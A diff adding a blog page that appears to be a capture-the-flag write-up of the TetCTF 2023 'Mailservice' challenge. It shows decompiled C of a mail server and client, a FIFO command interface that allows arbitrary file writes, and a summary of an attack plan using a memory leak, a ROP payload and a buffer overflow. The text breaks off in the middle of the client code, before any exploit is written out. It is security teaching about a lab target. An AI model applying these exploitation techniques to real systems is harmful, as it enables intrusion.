@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <link rel="stylesheet" href="/assets/css/normalize.css">
+  <link rel="stylesheet" href="/assets/css/ockham.css">
+  <script async src="/assets/js/ockham.js"></script>
+  <script async src="https://use.fontawesome.com/releases/v5.15.4/js/all.js"></script>
+
+  
+
+</head>
+
+
+  <body>
+    <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>This is where I'll post writeups and such</p>
+  </div>
+
+  
+  <nav class="sidebar-nav">
+    <ul class="sidebar-nav-list">
+    
+      <li">
+        <a href="/" class="sidebar-nav-item ">
+          Feed
+        </a>
+      </li>
+    
+      <li">
+        <a href="/about/" class="sidebar-nav-item ">
+          About
+        </a>
+      </li>
+    
+    </ul>
+  </nav>
+  
+
+  
+  <div class="sidebar-item">
+    
+      <a class="social-icon" href="https://github.com/Day91" target="_blank">
+        <i class="fab fa-github" title="GitHub"></i>
+      </a>
+    
+      <a class="social-icon" href="https://app.hackthebox.com/users/185587" target="_blank">
+        <i class="fas fa-cube" title="Hack The Box"></i>
+      </a>
+    
+  </div>
+  
+
+  <div class="sidebar-item">
+    <small>
+      Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a> & <a href="https://github.com/zivong/ockham" target="_blank">Ockham</a>
+    </small>
+  </div>
+</div>
+
+
+    <div class="wrap">
+      <div class="container">
+
+        <header class="masthead">
+          <div class="masthead-title">
+            <a href="/" title="Home">Day91's Blog</a>
+            <small>It's daytime somewhere :)</small>
+          </div>
+        </header>
+
+        <main>
+          <article class="post">
+  <h1 class="post-title">TetCTF 2023: Mailservice</h1>
+  <div class="post-meta">
+    <time datetime="2023-01-02T00:00:00+00:00" itemprop="datePublished">
+      02 Jan 2023
+    </time></div>
+
+  <p>This challenge featured a client and server binary both running on the same system operating as a basic mail sending/receiving service. The mailserver binary was being run internally on the system, listening on a port(that port was hidden from us) whilst the mailclient binary is what was run on connection to the challenge.
+<!--end_excerpt--></p>
+
+<p>I played this CTF with The WinRaRs and was the third to solve this challenge, and the first to solve with the intended solution.</p>
+
+<p>Anyway, let’s get into what that was!</p>
+
+<h2 id="summary">Summary</h2>
+<ol>
+  <li>Send emails to update.event@hackemall.live to interface with FIFO pipe</li>
+  <li>Use this to create a custom mail with big size and little data for leaking</li>
+  <li>Manipulate this to leak a content file path and build a ROP payload</li>
+  <li>Activate buffer overflow by making it read too many bytes</li>
+</ol>
+
+<p><a href="#interfacing-with-the-fifo">To skip to exploitation writeup</a></p>
+<h2 id="reversing">Reversing</h2>
+
+<h3 id="mailserver">Mailserver</h3>
+<p>I decided to get into reversing the server first. From the Dockerfile, we can tell that the mail server and client are both in their own separate users and the flag belongs to the mail client, however since the client would be interfacing with the server I thought it would be helpful to understand the server first and foremost.</p>
+
+<p>The first function that the mailserver binary calls looks like this
+<img src="https://i.imgur.com/BucOTI1.png" alt="open_files function" /></p>
+
+<p>It creates a FIFO named pipe in /home/mailserver/data called update.event, as well as setting some stirng to /home/mailserver/data/update.bin. More on this later.</p>
+
+<p>It then calls a function I named <code class="language-plaintext highlighter-rouge">do_listen</code>. Binja got kinda confused with shorts(assuming they were pointers to strings) here so I’m not including a screenshot, but it opens a socket and listens on it at address 127.0.0.1, port 9999. I’m going to skip over some of the networking details since they’re pretty unimportant for the challenge, despite the fact I reversed them pretty extensively.</p>
+
+<p>The server then enters a loop like so</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">((</span><span class="n">open_files</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">dolisten</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">pollfds</span><span class="p">[</span><span class="mh">0x2</span><span class="p">];</span>
+        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfds</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">open_files</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">pollfds</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">fd</span> <span class="o">=</span> <span class="n">eventfd</span><span class="p">;</span>
+            <span class="n">pollfds</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">events</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="n">pollfds</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">fd</span> <span class="o">=</span> <span class="n">sockfd</span><span class="p">;</span>
+            <span class="n">pollfds</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">events</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfds</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x1f4</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">((((</span><span class="kt">int32_t</span><span class="p">)</span><span class="n">pollfds</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">revents</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">handle_events</span><span class="p">();</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">((((</span><span class="kt">int32_t</span><span class="p">)</span><span class="n">pollfds</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">revents</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="kt">int32_t</span> <span class="n">var_54</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
+                        <span class="kt">int64_t</span> <span class="n">var_48</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+                        <span class="kt">int64_t</span> <span class="n">var_40_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                        <span class="kt">void</span> <span class="n">var_38</span><span class="p">;</span>
+                        <span class="kt">int32_t</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_38</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_54</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+                        <span class="p">{</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">fd</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_48</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+                            <span class="p">{</span>
+                                <span class="n">handle_sock</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+                                <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+                            <span class="p">}</span>
+                            <span class="k">else</span>
+                            <span class="p">{</span>
+                                <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Basically it polls both the FIFO and the socket on which its listening for events. If there’s an event on the FIFO it calls a special function to handle it, if there’s an event on the socket it calls a different function.</p>
+
+<h4 id="fifo-handling">FIFO Handling</h4>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cmd</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">int32_t</span> <span class="n">rax_3</span> <span class="o">=</span> <span class="n">cmd</span><span class="p">;</span>
+        <span class="kt">int32_t</span> <span class="n">len</span><span class="p">;</span>
+        <span class="kt">void</span> <span class="n">data</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">rax_3</span> <span class="o">==</span> <span class="err">'</span><span class="n">ATF</span><span class="err">'</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_2799</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+                <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span> <span class="o">==</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span>
+                <span class="p">{</span>
+                    <span class="kt">FILE</span><span class="o">*</span> <span class="n">filp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">bin_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_27a0</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">filp</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">fseek</span><span class="p">(</span><span class="n">filp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+                        <span class="kt">int32_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span>
+                        <span class="n">fseek</span><span class="p">(</span><span class="n">filp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+                        <span class="kt">int64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(((</span><span class="kt">int64_t</span><span class="p">)((</span><span class="n">size</span> <span class="o">+</span> <span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span> <span class="mi">1</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+                        <span class="p">{</span>
+                            <span class="n">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">));</span>
+                            <span class="n">fread</span><span class="p">((((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="n">ptr</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">size</span><span class="p">),</span> <span class="n">filp</span><span class="p">);</span>
+                            <span class="n">fseek</span><span class="p">(</span><span class="n">filp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+                            <span class="n">fwrite</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)(</span><span class="n">size</span> <span class="o">+</span> <span class="n">len</span><span class="p">)),</span> <span class="n">filp</span><span class="p">);</span>
+                            <span class="n">fclose</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span>
+                            <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="k">else</span>
+                        <span class="p">{</span>
+                            <span class="n">fclose</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rax_3</span> <span class="o">&gt;</span> <span class="err">'</span><span class="n">ATF</span><span class="err">'</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">rax_3</span> <span class="o">==</span> <span class="err">'</span><span class="n">SET</span><span class="err">'</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_2799</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+                    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span> <span class="o">==</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span>
+                    <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">bin_path</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+                        <span class="p">{</span>
+                            <span class="n">free</span><span class="p">(</span><span class="n">bin_path</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="n">bin_path</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">rax_3</span> <span class="o">==</span> <span class="err">'</span><span class="n">NEW</span><span class="err">'</span> <span class="o">&amp;&amp;</span> <span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_2799</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+                <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span> <span class="o">==</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span>
+                <span class="p">{</span>
+                    <span class="kt">FILE</span><span class="o">*</span> <span class="n">rax_24</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">bin_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_279c</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">rax_24</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">),</span> <span class="n">rax_24</span><span class="p">);</span>
+                        <span class="n">fclose</span><span class="p">(</span><span class="n">rax_24</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rax_3</span> <span class="o">==</span> <span class="err">'</span><span class="n">UPD</span><span class="err">'</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">system</span><span class="p">(</span><span class="s">"echo 1 &gt; /tmp/need_update"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">rax_3</span> <span class="o">==</span> <span class="err">'</span><span class="n">ATE</span><span class="err">'</span> <span class="o">&amp;&amp;</span> <span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_2799</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+            <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">eventfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span> <span class="o">==</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="kt">FILE</span><span class="o">*</span> <span class="n">rax_63</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">bin_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_27a0</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">rax_63</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">fseek</span><span class="p">(</span><span class="n">rax_63</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+                    <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">((</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">len</span><span class="p">),</span> <span class="n">rax_63</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">rax_63</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>Pretty long, right? Simplified,</p>
+<ol>
+  <li>It first reads 3 bytes from the FIFO. These act as a “command”, which can either be ATF, SET, NEW, UPD or ATE</li>
+  <li>In the case of any command that is not UPD, it also reads a decimal string of 3 bytes(e.g “004”) as the length for the rest of the data.</li>
+</ol>
+
+<p>ATF(which presumably stands for “Add to Front”) adds the data specified to the <em>beginning</em> of the file specified in <code class="language-plaintext highlighter-rouge">bin_path</code>
+SET sets <code class="language-plaintext highlighter-rouge">bin_path</code> to the file path specified
+NEW overwrites the data in <code class="language-plaintext highlighter-rouge">bin_path</code> with the data specified
+UPD runs <code class="language-plaintext highlighter-rouge">echo 1 &gt; /tmp/need_update</code>
+ATE(which presumably stands for “Add to End”) adds the data specified to the <em>end</em> of the file specified in <code class="language-plaintext highlighter-rouge">bin_path</code></p>
+
+<p>This appears to work as some kind of API to push updates. It’s likely only intended to be usable by a local user.</p>
+
+<p>There’s no forseeable vulns here(besides the fact this gives arbitrary file write) or any way to interact with this file. More on that later.</p>
+
+<h4 id="socket-handling">Socket handling</h4>
+<p>The function I named <code class="language-plaintext highlighter-rouge">handle_socket</code> is quite long and most of it is not necessary to understand for this challenge. To summarise, the mail server interacts with its clients through data packets of length STRICTLY 0x408 bytes.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">packet</span> <span class="p">{</span>
+	<span class="kt">uint32_t</span> <span class="n">signal</span><span class="p">;</span>
+	<span class="kt">uint32_t</span> <span class="n">len</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x400</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>NOTE: In my binary ninja outputs I named signal <code class="language-plaintext highlighter-rouge">cmd_or_signal</code> and I named buf <code class="language-plaintext highlighter-rouge">data</code>.</p>
+
+<p>In serverbound packets, <code class="language-plaintext highlighter-rouge">signal</code> specifies what operation the user wants to do (login, register, read mail or send mail). In clientbound packets, <code class="language-plaintext highlighter-rouge">signal</code> specifies whether the operation was successful or not. <code class="language-plaintext highlighter-rouge">len</code> gives the length of the data in <code class="language-plaintext highlighter-rouge">buf</code>, in bytes.</p>
+
+<p>The client communicates information to the server in form <code class="language-plaintext highlighter-rouge">var1=xxx;var2=xxx;var3=xxx</code>. It uses this to communicate usernames and passwords.</p>
+
+<p>Details for each key process are outlined here</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Register - /home/mailserver/data/users/USERNAME is created. /home/mailserver/data/users/USERNAME/passwd has the password(no hash) written to it.
+
+Login - The password is checked. If it is correct, the server sends back an access key NFA9BuWqoExEX5Ll. The access key gives the client unrestricted access to do any operation as any user, however since we can only interface with the mailserver through the limited mailclient, this is not exploitable.
+
+Read mail - /home/mailserver/USERNAME is read and sent back to the client.
+
+Send mail - the variables mailto, subject and content_path are read. At /home/mailserver/MAILTO, the data "SUBJECT|CONTENT_PATH" is written.
+</code></pre></div></div>
+
+<p>And that’s it for the mail server. Onto the mailclient!</p>
+
+<h3 id="mailclient">Mailclient</h3>
+<p>So, as expected, when logging in it builds the packet of form username=%s;password=%s and if the login is successful, saves the access key. Registering is relatively uninteresting. Reading and sending mail is when it gets interesting.</p>
+
+<h4 id="sending-mail">Sending mail</h4>
+
+<p>Removing the packet interaction with the server, the main code looks like this.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">printf</span><span class="p">(</span><span class="s">"Send to: "</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="n">var_518</span><span class="p">;</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%256[a-zA-Z0-9.@]%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_518</span><span class="p">);</span>
+    <span class="n">__isoc99_sscanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_518</span><span class="p">,</span> <span class="s">"%[a-zA-Z0-9.]@%[a-zA-Z0-9.]"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_418</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_318</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_318</span><span class="p">,</span> <span class="s">"hackemall.live"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Only support domain hackemall.li…"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Subject: "</span><span class="p">);</span>
+        <span class="kt">void</span> <span class="n">var_218</span><span class="p">;</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%256[a-zA-Z0-9.@#$^&amp;*() \/&lt;&gt;?]%*…"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_218</span><span class="p">);</span>
+        <span class="kt">char</span><span class="o">*</span> <span class="n">rax_8</span> <span class="o">=</span> <span class="n">make_tempfile</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">rax_8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Create tempfile error!"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="kt">void</span> <span class="n">tempfile_path</span><span class="p">;</span>
+            <span class="n">snprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tempfile_path</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"/tmp/mail/content/%s"</span><span class="p">,</span> <span class="n">rax_8</span><span class="p">);</span>
+            <span class="n">free</span><span class="p">(</span><span class="n">rax_8</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Content's size: "</span><span class="p">);</span>
+            <span class="kt">int32_t</span> <span class="n">content_size</span><span class="p">;</span>
+            <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">content_size</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">content_size</span> <span class="o">&gt;</span> <span class="mh">0x800</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">content_size</span> <span class="o">=</span> <span class="mh">0x800</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="kt">void</span> <span class="n">var_520</span><span class="p">;</span>
+            <span class="n">snprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_520</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s">"%04d"</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">content_size</span><span class="p">));</span>
+            <span class="kt">int64_t</span> <span class="n">rax_18</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(((</span><span class="kt">int64_t</span><span class="p">)(</span><span class="n">content_size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="kt">int32_t</span> <span class="n">content_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tempfile_path</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1ff</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">content_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Cann't create content file!"</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="n">write</span><span class="p">(</span><span class="n">content_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_520</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+                <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">rax_18</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">content_size</span><span class="p">));</span>
+                <span class="n">write</span><span class="p">(</span><span class="n">content_fd</span><span class="p">,</span> <span class="n">rax_18</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">content_size</span><span class="p">));</span>
+                <span class="n">close</span><span class="p">(</span><span class="n">content_fd</span><span class="p">);</span>
+                <span class="n">chmod</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tempfile_path</span><span class="p">,</span> <span class="mh">0x1ff</span><span class="p">);</span>
+                <span class="n">free</span><span class="p">(</span><span class="n">rax_18</span><span class="p">);</span>
+</code></pre></div></div>
+
